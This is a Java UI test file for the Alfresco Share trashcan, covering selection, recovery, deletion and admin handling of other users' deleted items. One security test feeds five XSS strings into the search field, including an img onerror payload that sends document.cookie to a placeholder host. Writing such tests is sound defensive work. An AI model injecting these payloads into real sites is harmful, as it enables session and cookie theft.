package org.alfresco.share.user.trashcan;

import org.alfresco.po.share.enums.UserRole;
import org.alfresco.po.share.exception.ShareException;
import org.alfresco.po.share.site.document.DocumentDetailsPage;
import org.alfresco.po.share.site.document.DocumentLibraryPage;
import org.alfresco.po.share.site.document.FolderDetailsPage;
import org.alfresco.po.share.site.document.ManagePermissionsPage;
import org.alfresco.po.share.user.SelectActions;
import org.alfresco.po.share.user.TrashCanItem;
import org.alfresco.po.share.user.TrashCanPage;
import org.alfresco.share.util.*;
import org.alfresco.share.util.api.CreateUserAPI;
import org.alfresco.webdrone.testng.listener.FailedTestListener;
import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.testng.Assert;
import org.testng.annotations.AfterMethod;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Listeners;
import org.testng.annotations.Test;

import java.util.List;

/**
 * @author Sergey Kardash on 10/10/2014.
 */
@Listeners(FailedTestListener.class)
public class TrashcanTest3 extends AbstractUtils
{
    private static final Logger logger = Logger.getLogger(TrashcanTest3.class);

    private String getCustomRoleName(String siteName, UserRole role)
    {
        return String.format("site_%s_%s", ShareUser.getSiteShortname(siteName), StringUtils.replace(role.getRoleName().trim(), " ", ""));
    }

    @Override
    @BeforeClass(alwaysRun = true)
    public void setup() throws Exception
    {

        super.setup();
        testName = this.getClass().getSimpleName();
        logger.info("Starting Tests: " + testName);
    }

    @AfterMethod(groups = "AlfrescoOne")
    public void quit() throws Exception
    {
        // Login as created user
        try
        {
            ShareUser.logout(drone);
            logger.info("Trashcan user logged out - drone.");
        }
        catch (Throwable e)
        {
            reportError(drone, testName, e);
        }

    }

    /**
     * Test - AONE_14183: XSS in Search field
     * <ul>
     * <li>XSS in Search field</li>
     * <li>Any user is created</li>
     * <li>The user is logged in to Share</li>
     * <li>Navigate to My Profile</li>
     * <li>Click on Trashcan</li>
     * <li>Enter any XSS string into 'Search' field</li>
     * <li>No XSS attack is made.</li>
     * <li>Data proceeds correctly.</li>
     * <li>Page formatting is not affected.</li>
     * <li>No odd elements/notifications on the page.</li>
     * <li>No results are found.</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14183() throws Exception
    {
        String testName = getTestName();
        String siteName1 = getSiteName(testName) + System.currentTimeMillis();

        String trashcanUser = getUserNameFreeDomain(testName + System.currentTimeMillis());

        String fileName1 = "fi1-" + getFileName(testName) + getRandomString(5);
        String fileName2 = "fi2-" + getFileName(testName) + getRandomString(5);

        String folderName1 = "fo3-" + getFolderName(testName) + getRandomString(5);
        String folderName2 = "fo4-" + getFolderName(testName) + getRandomString(5);

        // Any user is created
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser);

        // The user is logged in to Share
        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        String XSS_STRING_1 = "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">";
        String XSS_STRING_2 = "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">";
        String XSS_STRING_3 = "<DIV STYLE=\"width: expression(alert('XSS'));\">";
        String XSS_STRING_4 = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">";
        String XSS_STRING_5 = "<img><scrip<script>t>alert('XSS');<</script>/script>";

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        // Navigate to My Profile
        ShareUserProfile.navigateToTrashCan(drone);

        // Enter any XSS string into 'Search' field
        List<String> nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_1);
        Assert.assertTrue(nameOfItems.isEmpty(), "Any results are found.");

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_2);
        Assert.assertTrue(nameOfItems.isEmpty(), "Any results are found.");

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_3);
        Assert.assertTrue(nameOfItems.isEmpty(), "Any results are found.");

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_4);
        Assert.assertTrue(nameOfItems.isEmpty(), "Any results are found.");

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_5);
        Assert.assertTrue(nameOfItems.isEmpty(), "Any results are found.");

        ShareUser.logout(drone);
    }

    /**
     * Test - AONE-14186:'Select' drop-down menu
     * <ul>
     * <li>Any user is created</li>
     * <li>The user is logged in to Share</li>
     * <li>At least2 documents, 2 folders, were created and deleted by the user</li>
     * <li>Verify the 'Select' drop-down menu</li>
     * <li>Click 'Select All'</li>
     * <li>Tick the checkbox next to several item and click 'Invert Selection'</li>
     * <li>Click 'None' option</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14186() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameFreeDomain(testName + System.currentTimeMillis());
        String siteName = getSiteName(testName) + System.currentTimeMillis();

        String fileName1 = getFileName(testName) + "-1" + getRandomString(5);
        String fileName2 = getFileName(testName) + "-2" + getRandomString(5);

        String folderName1 = getFolderName(testName) + "-3" + getRandomString(5);
        String folderName2 = getFolderName(testName) + "-4" + getRandomString(5);

        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser);

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC).render();

        ShareUser.openSitesDocumentLibrary(drone, siteName);

        // At least2 documents, 2 folders, were created and deleted by the user
        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        // Select Content to delete
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        // Verify the 'Select' drop-down menu
        TrashCanPage trashCan = ShareUserProfile.navigateToTrashCan(drone).render();
        trashCan = trashCan.selectAction(SelectActions.ALL).render();

        // Select All.
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, fileName1).isCheckBoxSelected(), "File " + fileName1 + "isn't selected");
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, fileName2).isCheckBoxSelected(), "File " + fileName2 + "isn't selected");
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, folderName1).isCheckBoxSelected(), "Folder " + folderName1 + "isn't selected");
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, folderName2).isCheckBoxSelected(), "Folder " + folderName2 + "isn't selected");

        // Select none
        trashCan.selectAction(SelectActions.NONE).render();
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, fileName1).isCheckBoxSelected(), "File " + fileName1 + "is selected");
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, fileName2).isCheckBoxSelected(), "File " + fileName2 + "is selected");
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, folderName1).isCheckBoxSelected(), "Folder " + folderName1 + "is selected");
        Assert.assertFalse(ShareUserProfile.getTrashCanItem(drone, folderName2).isCheckBoxSelected(), "Folder " + folderName2 + "is selected");

        // Invert the selection.
        trashCan.selectAction(SelectActions.INVERT).render();
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, fileName1).isCheckBoxSelected(), "Selection of file " + fileName1 + "  isn't inverted");
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, fileName2).isCheckBoxSelected(), "Selection of file " + fileName2 + "  isn't inverted");
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, folderName1).isCheckBoxSelected(), "Selection of folder " + folderName1 + "  isn't inverted");
        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, folderName2).isCheckBoxSelected(), "Selection of folder " + folderName2 + "  isn't inverted");
    }

    /**
     * Test - AONE-14187:Selected items. Recover
     * <ul>
     * <li>Any user is created</li>
     * <li>The user is logged in to Share</li>
     * <li>At least 2 documents, 2 folders and 2 sites were created and deleted by the user</li>
     * <li>Select each type of the content (document, folder)</li>
     * <li>Click 'Selected items' -> Recover</li>
     * <li>Click 'OK' button and go to destination path of recovered items</li>
     * <li>Verify that the recovered items are present</li>
     * <li>Verify that the not recovered items aren't present</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14187() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameFreeDomain(testName + System.currentTimeMillis());
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser);

        String siteName1 = getSiteName(testName) + "-1" + System.currentTimeMillis();
        String siteName2 = getSiteName(testName) + "-2" + System.currentTimeMillis();

        String fileName1 = getFileName(testName) + "-3" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-4" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-5" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-6" + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        // At least 2 documents, 2 folders and 2 sites were created and deleted by the user
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();
        ShareUser.createSite(drone, siteName2, SITE_VISIBILITY_PUBLIC).render();

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        // Select content to be deleted
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        DocumentLibraryPage docLibPage;
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        SiteUtil.deleteSite(drone, siteName1);
        SiteUtil.deleteSite(drone, siteName2);

        // Trashcan page is opened
        ShareUserProfile.navigateToTrashCan(drone);

        // Select each type of the content (document, folder) and click 'Selected items' -> Recover
        ShareUserProfile.recoverTrashCanItem(drone, siteName1);
        ShareUserProfile.recoverTrashCanItem(drone, fileName1);
        ShareUserProfile.recoverTrashCanItem(drone, folderName1);

        // Verify that the not recovered items aren't present
        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertTrue(docLibPage.isFileVisible(fileName1), "File " + fileName1 + "isn't presented");
        Assert.assertTrue(docLibPage.isFileVisible(folderName1), "Folder " + folderName1 + "isn't presented");

        Assert.assertFalse(docLibPage.isFileVisible(fileName2), "File " + fileName2 + "is presented");
        Assert.assertFalse(docLibPage.isFileVisible(folderName2), "Folder " + folderName2 + "is presented");

        ShareUserProfile.navigateToTrashCan(drone);

        // These items are only present in Trashcan
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, fileName2).contains(fileName2), "File " + fileName2 + "isn't presented in Trashcan");
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, folderName2).contains(folderName2), "Folder " + folderName2 + "isn't presented in Trashcan");
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, siteName2).contains(siteName2.toLowerCase()), "Site " + siteName2
                + "isn't presented in Trashcan");

    }

    /**
     * Test - AONE-14188:Selected items. Delete
     * <ul>
     * <li>Any user is created</li>
     * <li>The user is logged in to Share</li>
     * <li>At least 2 documents, 2 folders and 2 sites were created and deleted by the user</li>
     * <li>Select each type of the content (document, folder)</li>
     * <li>Click 'Selected items' -> 'Delete' option</li>
     * <li>Click 'OK' button</li>
     * <li>Verify that the not deleted items aren't present</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14188() throws Exception
    {
        String testName = getTestName();
        String trashcanUser = getUserNameFreeDomain(testName + System.currentTimeMillis());
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser);

        String siteName1 = getSiteName(testName) + "-1" + System.currentTimeMillis();
        String siteName2 = getSiteName(testName) + "-2" + System.currentTimeMillis();

        String fileName1 = getFileName(testName) + "-3" + System.currentTimeMillis();
        String fileName2 = getFileName(testName) + "-4" + System.currentTimeMillis();

        String folderName1 = getFolderName(testName) + "-5" + System.currentTimeMillis();
        String folderName2 = getFolderName(testName) + "-6" + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();
        ShareUser.createSite(drone, siteName2, SITE_VISIBILITY_PUBLIC).render();

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        // Select Content to be deleted
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        SiteUtil.deleteSite(drone, siteName1);
        SiteUtil.deleteSite(drone, siteName2);

        ShareUserProfile.navigateToTrashCan(drone).render();

        ShareUserProfile.deleteTrashCanItem(drone, siteName1);
        ShareUserProfile.deleteTrashCanItem(drone, fileName1);
        ShareUserProfile.deleteTrashCanItem(drone, folderName1);

        // Verify that the not deleted items aren't present
        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, fileName1), "File " + fileName1 + " is presented in Trashcan");
        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName1), "Folder " + folderName1 + " is presented in Trashcan");
        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, siteName1), "Site " + siteName1 + " is presented in Trashcan");

        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, siteName2), "File " + siteName2 + " isn't presented in Trashcan");
        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, folderName2), "Folder " + folderName2 + " isn't presented in Trashcan");
        Assert.assertTrue(ShareUserProfile.isTrashCanItemPresent(drone, fileName2), "Site " + fileName2 + " isn't presented in Trashcan");

    }

    /**
     * Test - AONE-14189:Admin - access to deleted by another user items
     * <ul>
     * <li>Any user is created, e.g. user1</li>
     * <li>for Cloud: Some users are created (e.g. user1@cloud.test - Network Admin and user2@cloud.test - Network Member)</li>
     * <li>Any site is created by user1 (for Cloud by user2@cloud.test)</li>
     * <li>Several content items were created and deleted by user1 (for Cloud by user2@cloud.test)</li>
     * <li>Admin user is logged in the Share (for Cloud Network Admin)</li>
     * <li>Open User Profile > Trashcan page</li>
     * <li>All the deleted by user1 (for Cloud by user2@cloud.test) content items are present in the admin user's trashcan</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14189() throws Exception
    {
        String testName = getTestName();
        String siteName1 = getSiteName(testName) + System.currentTimeMillis();

        String trashcanUser1 = getUserNameFreeDomain(testName + "user1" + System.currentTimeMillis());
        String trashcanUser2 = getUserNameFreeDomain(testName + "user2" + System.currentTimeMillis());

        String fileName1 = "fi1-" + getFileName(testName) + System.currentTimeMillis() + ".txt";
        String folderName1 = "fo3-" + getFolderName(testName) + System.currentTimeMillis();
        String commentForFile = "Whats up " + fileName1 + ", How you doing?";
        String commentForFolder = "Whats up " + folderName1 + ", How you doing?";

        // for Cloud: Some users are created
        // (e.g. user1@cloud.test - Network Admin and user2@cloud.test - Network Member)
        if (!isAlfrescoVersionCloud(drone))
        {
            CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser1);
        }
        else
        {
            // create Network Admin
            CreateUserAPI.createActivateUserAsTenantAdmin(drone, ADMIN_USERNAME, trashcanUser1);
        }

        if (isAlfrescoVersionCloud(drone))
        {
            // create Network Member
            CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser2);
        }

        // Admin user is logged in the Share (for Cloud Network Admin)
        if (!isAlfrescoVersionCloud(drone))
        {
            ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        }
        else
        {
            ShareUser.login(drone, trashcanUser2, DEFAULT_PASSWORD);
        }
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();

        // Several content items were created and deleted by user1 (for Cloud by user2@cloud.test)
        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        ShareUserSitePage.addComment(drone, fileName1, commentForFile);

        ShareUser.openDocumentLibrary(drone);

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);

        ShareUserSitePage.addComment(drone, folderName1, commentForFolder);

        ShareUser.openDocumentLibrary(drone);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        // All the deleted by user1 (for Cloud by user2@cloud.test)
        // content items are present in the admin user's trashcan
        if (!isAlfrescoVersionCloud(drone))
        {
            ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        }
        else
        {
            ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        }

        ShareUserProfile.navigateToTrashCan(drone);

        TrashCanItem trashCanItem = ShareUserProfile.getTrashCanItem(drone, fileName1);
        Assert.assertTrue(trashCanItem.getFileName().equalsIgnoreCase(fileName1), "File " + fileName1 + " isn't presented in Trashcan");

        trashCanItem = ShareUserProfile.getTrashCanItem(drone, folderName1);
        Assert.assertTrue(trashCanItem.getFileName().equalsIgnoreCase(folderName1), "Folder " + folderName1 + " isn't presented in Trashcan");

        ShareUser.logout(drone);
    }

    /**
     * Test - AONE-14190:Admin - recover deleted by another user items
     * <ul>
     * <li>Any user is created, e.g. user1</li>
     * <li>for Cloud: Some users are created (e.g. user1@cloud.test - Network Admin and user2@cloud.test - Network Member)</li>
     * <li>Any site is created by user1 (for Cloud by user2@cloud.test)</li>
     * <li>Several content items were created and deleted by user1 (for Cloud by user2@cloud.test)</li>
     * <li>Admin user is logged in the Share (for Cloud Network Admin)</li>
     * <li>Open User Profile > Trashcan page</li>
     * <li>All the deleted by user1 (for Cloud by user2@cloud.test) content items are present in the admin user's trashcan</li>
     * <li>Recover all the content items</li>
     * <li>Login as user1 (for Cloud as user2@cloud.test)</li>
     * <li>The content items appeared to their original location</li>
     * <li>Verify the user1's (for Cloud user2@cloud.test) access to the recovered content items.</li>
     * <li>The content items are absent in the trashcan</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14190() throws Exception
    {

        String testName = getTestName();
        String siteName1 = getSiteName(testName) + System.currentTimeMillis();

        String trashcanUser1 = getUserNameFreeDomain(testName + "user1" + System.currentTimeMillis());
        String trashcanUser2 = getUserNameFreeDomain(testName + "user2" + System.currentTimeMillis());

        String fileName1 = "fi1-" + getFileName(testName) + System.currentTimeMillis() + ".txt";
        String folderName1 = "fo3-" + getFolderName(testName) + System.currentTimeMillis();

        String commentForFile = "Whats up " + fileName1 + ", How you doing?";
        String commentForFolder = "Whats up " + folderName1 + ", How you doing?";

        if (!isAlfrescoVersionCloud(drone))
        {
            // Any user is created, e.g. user1
            CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser1);
        }
        else
        {
            // for Cloud: Some users are created (e.g. user1@cloud.test - Network Admin)
            CreateUserAPI.createActivateUserAsTenantAdmin(drone, ADMIN_USERNAME, trashcanUser1);
        }

        if (isAlfrescoVersionCloud(drone))
        {
            // for Cloud: Some users are created (e.g. user2@cloud.test - Network Member)
            CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser2);
        }

        if (!isAlfrescoVersionCloud(drone))
        {
            ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        }
        else
        {
            ShareUser.login(drone, trashcanUser2, DEFAULT_PASSWORD);
        }

        // Several content items were created and deleted by user1 (for Cloud by user2@cloud.test)
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();

        ShareUser.openSitesDocumentLibrary(drone, siteName1).render();

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        DocumentLibraryPage docLibPage;
        ShareUserSitePage.createFolder(drone, folderName1, folderName1);

        ShareUserSitePage.addComment(drone, fileName1, commentForFile);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUserSitePage.addComment(drone, folderName1, commentForFolder);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        // Admin user is logged in the Share (for Cloud Network Admin)
        if (!isAlfrescoVersionCloud(drone))
        {
            ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        }
        else
        {
            ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        }

        ShareUserProfile.navigateToTrashCan(drone);

        // Recover all the content items
        ShareUserProfile.recoverTrashCanItem(drone, fileName1);
        ShareUserProfile.recoverTrashCanItem(drone, folderName1);

        ShareUser.logout(drone);

        // Login as user1 (for Cloud as user2@cloud.test)
        if (!isAlfrescoVersionCloud(drone))
        {
            ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        }
        else
        {
            ShareUser.login(drone, trashcanUser2, DEFAULT_PASSWORD);
        }

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertTrue(docLibPage.isFileVisible(fileName1), "File " + fileName1 + " isn't presented in Doc Lib");

        DocumentDetailsPage docDetailsPage = docLibPage.selectFile(fileName1).render();

        Assert.assertTrue(docDetailsPage.getComments().contains(commentForFile), "Comment for file " + fileName1 + " isn't presented");

        docLibPage = ShareUser.openDocumentLibrary(drone);

        Assert.assertTrue(docLibPage.isFileVisible(folderName1), "Folder " + folderName1 + " isn't presented in Doc Lib");

        FolderDetailsPage folderDetailsPage = docLibPage.getFileDirectoryInfo(folderName1).selectViewFolderDetails().render();

        Assert.assertTrue(folderDetailsPage.getComments().contains(commentForFolder), "Comment for folder " + folderName1 + " isn't presented");

        // Verify the user1's (for Cloud user2@cloud.test) access to the recovered content items
        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        // The user has original access level to all the recovered content items, i.e. manager permissions
        ManagePermissionsPage managePermissionPage = ShareUserSitePage.manageContentPermissions(drone, fileName1);

        String role = managePermissionPage.getInheritedPermissions().get(getCustomRoleName(siteName1, UserRole.SITEMANAGER));
        Assert.assertEquals(role, UserRole.SITEMANAGER.getRoleName(),
                "The user hasn't original access level to the recovered content item (i.e. manager permissions)");
        managePermissionPage.selectCancel().render();
        ShareUser.openDocumentLibrary(drone);

        managePermissionPage = ShareUserSitePage.manageContentPermissions(drone, folderName1);

        role = managePermissionPage.getInheritedPermissions().get(getCustomRoleName(siteName1, UserRole.SITEMANAGER));
        Assert.assertEquals(role, UserRole.SITEMANAGER.getRoleName(),
                "The user hasn't original access level to the recovered content item (i.e. manager permissions)");
        managePermissionPage.selectCancel().render();

        // The content items are absent in the trashcan
        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, fileName1), "The content item (file) are present in the trashcan");
        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName1), "The content item (folder) are present in the trashcan");

        ShareUser.logout(drone);

    }

    /**
     * Test - AONE-14191:Admin - delete deleted by another user items
     * <ul>
     * <li>Any user is created, e.g. user1</li>
     * <li>for Cloud: Some users are created (e.g. user1@cloud.test - Network Admin and user2@cloud.test - Network Member)</li>
     * <li>Any site is created by user1 (for Cloud by user2@cloud.test)</li>
     * <li>Several content items were created and deleted by user1 (for Cloud by user2@cloud.test)</li>
     * <li>Admin user is logged in the Share (for Cloud Network Admin)</li>
     * <li>Open User Profile > Trashcan page</li>
     * <li>All the deleted by user1 (for Cloud by user2@cloud.test) content items are present in the admin user's trashcan</li>
     * <li>Delete all the content items</li>
     * <li>Login as user1 (for Cloud as user2@cloud.test)</li>
     * <li>The content items are absent in their original location</li>
     * <li>Verify the user1's (for Cloud user2@cloud.test) trashcan</li>
     * <li>The content items are absent in the trashcan</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14191() throws Exception
    {
        String testName = getTestName();
        String siteName1 = getSiteName(testName) + System.currentTimeMillis();

        String trashcanUser1 = getUserNameFreeDomain(testName + "user1" + System.currentTimeMillis());
        String trashcanUser2 = getUserNameFreeDomain(testName + "user2" + System.currentTimeMillis());

        String fileName1 = "fi1-" + getFileName(testName) + System.currentTimeMillis() + ".txt";
        String folderName1 = "fo3-" + getFolderName(testName) + System.currentTimeMillis();
        String commentForFile = "Whats up " + fileName1 + ", How you doing?";
        String commentForFolder = "Whats up " + folderName1 + ", How you doing?";

        if (!isAlfrescoVersionCloud(drone))
        {
            CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser1);
        }
        else
        {
            CreateUserAPI.createActivateUserAsTenantAdmin(drone, ADMIN_USERNAME, trashcanUser1);
        }

        if (isAlfrescoVersionCloud(drone))
        {
            CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser2);
        }

        // Login as user1 (for Cloud by user2@cloud.test)
        if (!isAlfrescoVersionCloud(drone))
        {
            ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        }
        else
        {
            ShareUser.login(drone, trashcanUser2, DEFAULT_PASSWORD);
        }

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();

        ShareUser.openSitesDocumentLibrary(drone, siteName1).render();

        // Several content items were created and deleted by user1 (for Cloud by user2@cloud.test)
        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        DocumentLibraryPage docLibPage;
        ShareUserSitePage.createFolder(drone, folderName1, folderName1);

        ShareUserSitePage.addComment(drone, fileName1, commentForFile);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUserSitePage.addComment(drone, folderName1, commentForFolder);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, folderName1);

        ShareUser.deleteSelectedContent(drone);

        // Admin user is logged in the Share (for Cloud Network Admin)
        if (!isAlfrescoVersionCloud(drone))
        {
            ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        }
        else
        {
            ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        }

        ShareUserProfile.navigateToTrashCan(drone);
        TrashCanItem trashCanItem = ShareUserProfile.getTrashCanItem(drone, fileName1);
        Assert.assertTrue(trashCanItem.getFileName().equalsIgnoreCase(fileName1), "File " + fileName1 + " isn't presented in Trashcan");
        ShareUserProfile.deleteTrashCanItem(drone, fileName1);

        trashCanItem = ShareUserProfile.getTrashCanItem(drone, folderName1);
        Assert.assertTrue(trashCanItem.getFileName().equalsIgnoreCase(folderName1), "Folder " + folderName1 + " isn't presented in Trashcan");
        ShareUserProfile.deleteTrashCanItem(drone, folderName1);

        // Admin user is logged in the Share (for Cloud Network Admin)
        if (!isAlfrescoVersionCloud(drone))
        {
            ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        }
        else
        {
            ShareUser.login(drone, trashcanUser2, DEFAULT_PASSWORD);
        }

        // Check content as User

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertFalse(docLibPage.isFileVisible(fileName1), "File " + fileName1 + " is presented in Doc Lib");
        Assert.assertFalse(docLibPage.isFileVisible(folderName1), "Folder " + folderName1 + " is presented in Doc Lib");

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, fileName1), "File " + fileName1 + " is presented in Trashcan");
        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName1), "Folder " + folderName1 + " is presented in Trashcan");

        ShareUser.logout(drone);
    }

    /**
     * Test - AONE-14194:Recover a document with Granular Permissions applied
     * <ul>
     * <li>Any three users are created, e.g. user1, user2</li>
     * <li>Any user is logged in the Share, e.g. user1</li>
     * <li>Any site is created</li>
     * <li>Any document is uploaded to the site's Document Library</li>
     * <li>Manage Permissions page is opened for the created document</li>
     * <li>Add the created in the pre-condition user, e.g. user2/li>
     * <li>Set any permissions level to the user, e.g. Collaborator</li>
     * <li>Delete the document</li>
